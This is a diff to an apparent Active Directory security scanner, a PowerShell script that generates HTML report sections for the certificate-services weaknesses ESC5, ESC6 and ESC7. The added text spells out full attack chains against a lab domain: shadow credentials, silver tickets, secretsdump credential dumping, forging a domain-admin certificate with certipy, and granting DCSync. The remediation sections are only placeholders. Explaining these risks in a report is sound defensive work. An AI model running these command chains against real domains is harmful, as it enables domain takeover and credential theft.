@@ -727,7 +727,7 @@ function Invoke-ADScanner {
                                         </table></td>
                                         <td class="explanation">
                                             <p>ESC5 is a vulnerability where a low privileged user has unsafe rights over PKI objects such as the CA object in AD. $($finding.IdentityReference) has $($finding.ActiveDirectoryRights) over $($finding.DistinguishedName), giving full control of the certificate authority, and the domain PKI which is a tier 0 asset (as important as a domain controller).</p>
-                                            <p>Compromise of a certificate authority allows a user extract the CA privat ekey and use it to forge authentication certificates, allowing a user to craft certificates for a domain administrator.</p> 
+                                            <p>Compromise of a certificate authority allows a user extract the CA private key and use it to forge authentication certificates for any user, allowing impersonation of a domain administrator.</p> 
                                             <p class="links"><b>Further information:</b></p>
                                             <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                             <p><a href="https://luemmelsec.github.io/Skidaddle-Skideldi-I-just-pwnd-your-PKI/#esc5">Link 2</a></p>
@@ -754,6 +754,10 @@ function Invoke-ADScanner {
                                             <div class="attack-container">
                                                 <div class="attack-text">
                                                     <p>2. With these permissions, the user can add shadow credentials to the CA object to obtain a certificate as the CA server.</p> 
+                                                    <p class="code">python3 pywhisker.py -d test.local -u test -p 'Password123!' --target 'ca$' --action add --dc-ip dc.test.local</o>
+                                                   
+                                                    <p>With the shadow credentials updated a TGT for the CA can be requested</p>
+                                                    <p class="code">python3 gettgtpkinit.py test.local/'ca$' -cert-pfx ../pywhisker/hguhjXMA.pfx -pfx-pass kE2JBsYrnlfjY1iXzZQn out.ccache</p>
                                                 </div>
                                                 <span class="image-cell">
                                                     <img src="/Private/Report/Images/PKI/ESC5-2.png" alt="Finding ESC5">
@@ -762,7 +766,9 @@ function Invoke-ADScanner {
                                             <hr>
                                             <div class="attack-container">
                                                 <div class="attack-text">
-                                                    <p>3. With shadow credentials, the user can extract the NTLM hash of the certificate authority.</p> 
+                                                    <p>3. From the TGT h shadow credentials, the user can extract the NTLM hash of the certificate authority.</p> 
+                                                    <p class="code">export KRB5CCNAME=out.ccache</p>                                                                                                                    
+                                                    <p class="code">python3 getnthash.py -key 07df53520ac65b82c309918e26f8c4384086af39f6ff264809cb2c186b0162e9 test.local/'ca$'</p>
                                                 </div>
                                                 <span class="image-cell">
                                                     <img src="/Private/Report/Images/PKI/ESC5-3.png" alt="Finding ESC5">
@@ -771,7 +777,13 @@ function Invoke-ADScanner {
                                             <hr>
                                             <div class="attack-container">
                                                 <div class="attack-text">
-                                                    <p>4. With the CA authority NTLM hash, a silver ticket can be crafted, then dump credentials to extract a local administrator credentials to get admin access to the PKI.</p> 
+                                                    <p>4. With the CA authority NTLM hash, a silver ticket can be crafted.</p> 
+                                                    <p class="code">impacket-ticketer -domain-sid S-1-5-21-1189352953-3643054019-2744120995 -domain test.local -spn HOST/ca.test.local -nthash</p>
+
+                                                    <p>The silver ticket can be used to dump credentials to extract a local administrator credentials to get admin access to the PKI.</p>
+                                                    <p class="code">export KRB5CCNAME=Administrator.ccache</p>
+                                                    <p class="code">impacket-secretsdump 'administrator'@ca.test.local -k -no-pass<p>
+
                                                 </div>
                                                 <span class="image-cell">
                                                     <img src="/Private/Report/Images/PKI/ESC5-4.png" alt="Finding ESC5">
@@ -782,6 +794,7 @@ function Invoke-ADScanner {
                                                 <div class="attack-text">
                                                     <p>5. With admin access to the CA, the CA certificate and private key can be extracted with certipy.</p>
                                                     <p class="code">certipy ca -backup -ca 'test-CA-CA' -username administrator@ca.test.local -hashes :2b576acbe6bcfda7294d6bd18041b8fe</p>
+                                                    
                                                     <p> The CA private key can then be used to craft a certificate for a domain administrator.</p>
                                                     <p class="code">certipy forge -ca-pfx test-CA-CA.pfx -upn administrator@test.local -subject 'CN=Administrator,CN=Users,DC=test,DC=local'</p>
                                                 </div>
@@ -794,18 +807,11 @@ function Invoke-ADScanner {
                                             <div class="attack-container">
                                                 <div class="attack-text">
                                                     <p>The certificate can be used with pass-the-cert to grant a user DCSync rights.</p>
-                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
-                                                   
-                                                    <p></p>
-                                                    <p class="code">certipy cert -pfx administrator_forged.pfx -nokey -out administrator.crt</p>
-                                                    
-                                                    <p></p>                                                                                                                                                       
-                                                    <p class="code">certipy cert -pfx administrator_forged.pfx -nocert -out administrator.key</p>
-                                                  
-                                                    <p></p>                                                                                                                                                         
+                                                    <p class="code">certipy cert -pfx administrator_forged.pfx -nokey -out administrator.crt</p>                                                                                                                                                       
+                                                    <p class="code">certipy cert -pfx administrator_forged.pfx -nocert -out administrator.key</p>                                                                                                                                                        
                                                     <p class="code">python3 /home/kali/Desktop/passthecert.py -action modify_user -crt administrator.crt -key administrator.key -target test -elevate -domain test.local -dc-ip 192.168.10.141</p>
                                                     
-                                                    <p></p>    
+                                                    <p>With DCSync privileged granted the low-priivleged user can extract all password hashes from the domain.</p>    
                                                     <p class="code">impacket-secretsdump test:'Password123!'@dc.test.local</p>
                                                 </div>
                                                 <span class="image-cell">
@@ -836,11 +842,215 @@ function Invoke-ADScanner {
 "@
             }
             elseif($finding.Technique -eq "ESC6"){
+                $nospaceid = $finding.Technique.Replace(" ", "-")
                 $PKIhtml += @"
+                <tr>
+                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
+                    <td class="finding-riskcritical">$($finding.Risk)</td>
+                </tr>
+                <tr class="finding">
+                    <td colspan="3">
+                        <div class="finding-info">
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Issue</th>
+                                        <th>MITRE ATT&CK ref</th>
+                                        <th>Score</th>
+                                    </tr>
+                                    <tr>
+                                        <td>Certificate Authority has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set allowing low-privileged users to impersonate a domain admin.</td>
+                                        <td>T-15940</td>
+                                        <td>+$($finding.Score)</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Relevant info</th>
+                                        <th>Issue explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td class="relevantinfo"><table>
+                                            <tr><td class="grey">CA Name</td><td>$($finding."CAName")</td></tr>
+                                            <tr><td class="grey">CA hostname</td><td>$($finding."CAhostname")</td></tr>
+                                        </table></td>
+                                        <td class="explanation">
+                                            <p>ESC6 is a vulnerability within ADCS where a Certificate Authority has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set. This flag allows the enrollee to specify an arbitrary SAN on all certificates despite a certificate template's configuration, meaning any certificate that permits client authentication are vulnerable to ESC1 even if they do not allow a user to supply a SAN.</p>
+                                            <p>This allows a low-privileged user to enroll in any authentication template supplying a SAN of Administrator, and then authenticate as the domain administrator.</p>
+                                            <p class="links"><b>Further information:</b></p>
+                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
+                                            <p><a href="https://redfoxsec.com/blog/exploiting-active-directory-certificate-services-ad-cs/">Link 2</a></p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Attack explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>1. A low-privileged user can remotely enumerate domain certificate authorities HTTP web services endpoints and see if they are lacking relaying protections using certipy. 
+                                                    </p>
+                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC6-1.png" alt="Finding ESC6">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>2. Just as in ESC1, a low-privileged user can enroll in the certificate template specifying a UPN of a domain administrator in the SAN.</p>
+                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template User -upn administrator@test.local -dns dc.test.local</p>
+                                                             
+                                                    <p>The low-privileged user can then use this certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
+                                                    <p class="code">certipy auth -pfx administrator_dc.pfx -dc-ip 192.168.10.141</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC6-2.png" alt="Exploiting ESC6">
+                                                </span>
+                                            </div>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Remediation (GPT to contextualize)</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <p>ESC6 remediation</p>
+                                            <p>run command 1</p>
+                                            <p>run command 2</p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </td>
+                </tr>
 "@
             }
             elseif($finding.Technique -eq "ESC7"){
+                $nospaceid = $finding.Technique.Replace(" ", "-")
                 $PKIhtml += @"
+                <tr>
+                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
+                    <td class="finding-riskcritical">$($finding.Risk)</td>
+                </tr>
+                <tr class="finding">
+                    <td colspan="3">
+                        <div class="finding-info">
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Issue</th>
+                                        <th>MITRE ATT&CK ref</th>
+                                        <th>Score</th>
+                                    </tr>
+                                    <tr>
+                                        <td>Low-privileged user has Manage CA or Manage Certificate rights allowing impersonation of a domain admin.</td>
+                                        <td>T-15940</td>
+                                        <td>+$($finding.Score)</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Relevant info</th>
+                                        <th>Issue explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td class="relevantinfo"><table>
+                                            <tr><td class="grey">CA Name</td><td>$($finding.Name)</td></tr>
+                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
+                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
+                                        </table></td>
+                                        <td class="explanation">
+                                            <p>ESC7 is a vulnerability within ADCS where a low-privileged user has the ManageCA or Manage Certificate rights.</p>
+                                            <p>This allows a low-privileged user to approve failed certificates requests, such ass failed ESC1 requests (allowing ESC1).</p>
+                                            <p class="links"><b>Further information:</b></p>
+                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
+                                            <p><a href="https://www.tarlogic.com/blog/ad-cs-esc7-attack/">Link 2</a></p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Attack explanation</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>1. A low-privileged user can remotely enumerate domain certificate authorities HTTP web services endpoints and see if they are lacking relaying protections using certipy.</p>
+                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC7-1.png" alt="Finding ESC7">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>1. The SubCA template can be enabled on the CA with the -enable-template parameter.</p>
+                                                    <p class="code">certipy ca -ca 'test-CA-CA' -target ca.test.local -enable-template SubCA -u test@test.local -p 'Password123!'</p>
+
+                                                    <p>A certificate based on the SubCA template can be requested like in ESC1. This request will be denied, but we will save the private key and note down the request ID.</p>
+                                                    <p class="code">certipy req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template SubCA -upn administrator@test.local</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC7-2.png" alt="Exploiting ESC7">
+                                                </span>
+                                            </div>
+                                            <hr>
+                                            <div class="attack-container">
+                                                <div class="attack-text">
+                                                    <p>2. The failed certificate request can be issued with the ca command and the -issue-request <request ID> parameter.</p>
+                                                    <p class="code">certipy ca -ca 'test-CA-CA' -target ca.test.local -issue-request 57 -u test@test.local -p 'Password123!'</p>
+
+                                                    <p>The issued certificate can then be retrieved with the req command.</p>
+                                                    <p class="code">certipy req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -retrieve 57</p>
+                                                             
+                                                    <p>The certificate can then be used with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
+                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
+                                                </div>
+                                                <span class="image-cell">
+                                                    <img src="/Private/Report/Images/PKI/ESC7-3.png" alt="Exploiting ESC7">
+                                                </span>
+                                            </div>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            <table>
+                                <tbody>
+                                    <tr>
+                                        <th>Remediation (GPT to contextualize)</th>
+                                    </tr>
+                                    <tr>
+                                        <td>
+                                            <p>ESC7 remediation</p>
+                                            <p>run command 1</p>
+                                            <p>run command 2</p>
+                                        </td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </td>
+                </tr>
 "@
             }
             elseif($finding.Technique -eq "ESC8"){
